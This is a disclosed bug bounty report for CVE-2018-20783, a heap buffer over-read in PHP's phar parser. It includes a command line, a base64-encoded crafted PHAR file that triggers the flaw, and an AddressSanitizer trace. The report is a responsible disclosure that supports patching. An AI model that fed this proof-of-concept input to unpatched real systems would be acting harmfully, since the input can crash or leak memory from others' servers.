# [H] Heap Buffer Overflow (READ: 4) in phar_parse_pharfile

## Summary
Severity: High (CVSS 7.5)
Program: Internet Bug Bounty
Weakness: Buffer Over-read
Reporter: cy1337
State: resolved
Disclosed: 2020-10-10T01:00:02.500Z
CVE: CVE-2018-20783
Source: https://hackerone.com/reports/477344

## Details
Phar files with __HALT_COMPILER(); in unexpected places can lead to a buffer overrun. This is something I found while fuzzing with AFL using an ASAN instrumented PHP.

The issue can be observed by disabling the ZEND allocator and using ASAN (or valgrind/etc?) with a crafted phar as input. I have prepared an example PHAR file *php-oob4.phar*
```
USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r "var_dump(new Phar('php-oob4.phar',0,'project.phar'));"
```
Base64 encoding of *php-oob4.phar* is as follows:
```
X19IQUxUX0NPTVBJTEVSKCk7CgAAANQpRbJAlS4oDzkKFD1B2bK4fX3DAgAAAEdCTUI=
```

OUTPUT
====
The following ASAN report was generated from this test case:
```
=================================================================
==2741==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ab7a at pc 0x0000013258a7 bp 0x7ffd845ab330 sp 0x7ffd845ab328
READ of size 4 at 0x60200000ab7a thread T0
    #0 0x13258a6 in phar_parse_pharfile /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2
    #1 0x13258a6 in phar_open_from_fp /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1708
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7
    #7 0x1c15f56 in zend_execute /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:63776:2
    #8 0x1a07225 in zend_eval_stringl /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1083:4
    #9 0x1a07d6a in zend_eval_stringl_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1124:11
    #10 0x1a07d6a in zend_eval_string_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1135
    #11 0x200c501 in do_cli /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1042:8
    #12 0x200960c in main /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1404:18
    #13 0x7f21462e082f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #14 0x43a598 in _start (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x43a598)

0x60200000ab7a is located 0 bytes to the right of 10-byte region [0x60200000ab70,0x60200000ab7a)
allocated by thread T0 here:
    #0 0x4da6c8 in __interceptor_malloc (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x4da6c8)
    #1 0x192899c in __zend_malloc /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_alloc.c:2829:14
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/477344_
